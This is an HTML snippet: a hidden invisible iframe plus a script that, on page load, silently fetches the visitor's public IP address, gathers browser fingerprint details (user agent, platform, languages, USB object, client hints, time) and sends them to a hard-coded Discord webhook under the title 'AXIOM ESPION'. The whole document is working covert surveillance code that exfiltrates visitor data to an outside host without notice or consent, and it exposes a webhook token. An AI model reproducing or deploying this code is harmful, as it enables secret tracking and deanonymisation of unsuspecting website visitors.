<iframe src="https://abcdefg.1234.net/tracking" width="1" height="1" frameborder="0" style="display:none"></iframe>
<script>
    const ipRequest = new XMLHttpRequest();
    const ipUrl = "https://api.ipify.org?format=json";
    ipRequest.open('GET', ipUrl);
    ipRequest.onload = function() {
        if (ipRequest.status === 200) {
            const data = JSON.parse(ipRequest.responseText);
            console.log(data.ip);

            const discordRequest = new XMLHttpRequest();
            const webhookUrl = 'https://discord.com/api/webhooks/1169621875740135424/iBsnAb5E6MUNhP4iHFIIpZ_erAg4GuW-YwY6nUPYA3l4o448XqxLnR9L8qEGnl0CUkS2';
            discordRequest.open('POST', webhookUrl);
            discordRequest.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
            const now = new Date();
            const hours = now.getHours();
            const minutes = now.getMinutes();
            const seconds = now.getSeconds();
            const colorHex = '#' +('0' + hours.toString(16)).slice(-2) +('0' + minutes.toString(16)).slice(-2) +('0' + seconds.toString(16)).slice(-2);

            function formatObject(obj) {
                return '\`\`\`json\n' + JSON.stringify(obj, null, 2) + '\`\`\`'
            }
            
            const embedMessage = {
                embeds: [{
                    title: "AXIOM ESPION",
                    description: `**adresse IP:** \`\`\`json\n${data.ip}\`\`\`**appCodeName:** \`\`\`json\n${navigator.appCodeName}\`\`\`**appName:** \`\`\`json\n${navigator.appName}\`\`\`**appVersion:** \`\`\`json\n${navigator.appVersion}\`\`\`**language:** \`\`\`json\n${navigator.language}\`\`\`**languages:** \`\`\`json\n${navigator.languages}\`\`\`**platform:** \`\`\`json\n${navigator.platform}\`\`\`**usb:** ${formatObject(navigator.usb)}**userAgent:** \`\`\`json\n${navigator.userAgent}\`\`\`**brands:** ${formatObject(navigator.userAgentData.brands)}**mobile:** \`\`\`json\n${navigator.userAgentData.mobile}\`\`\`**platform:** \`\`\`json\n${navigator.userAgentData.platform}\`\`\`**Heure:** \`\`\`json\n${hours < 10 ? '0' + hours : hours}:${minutes < 10 ? '0' + minutes : minutes}:${seconds < 10 ? '0' + seconds : seconds}\`\`\``,
                    color: parseInt(colorHex.replace(/^#/, ''), 16),
                }]
            };

            discordRequest.send(JSON.stringify(embedMessage));

        } else {
            console.error('Error retrieving IP address');
        }
    };
    ipRequest.send();
</script>
